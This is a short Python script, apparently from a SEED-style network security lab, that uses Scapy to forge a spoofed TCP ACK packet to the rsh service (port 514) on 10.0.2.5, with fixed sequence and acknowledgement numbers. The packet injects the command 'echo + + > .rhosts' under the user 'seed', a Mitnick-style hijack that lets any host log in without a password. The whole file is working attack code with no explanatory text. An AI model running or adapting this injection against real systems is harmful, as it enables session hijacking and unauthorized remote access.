from scapy.all import *

ip = IP(src="10.0.2.4", dst="10.0.2.5")
tcp = TCP(sport=1023, dport=514, flags="A", seq=778933537, ack=1629154026)

if tcp.flags == "A":
	print("Establishing ACK packet")

data = '9091\x00seed\x00seed\x00echo + + > .rhosts\x00'
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)
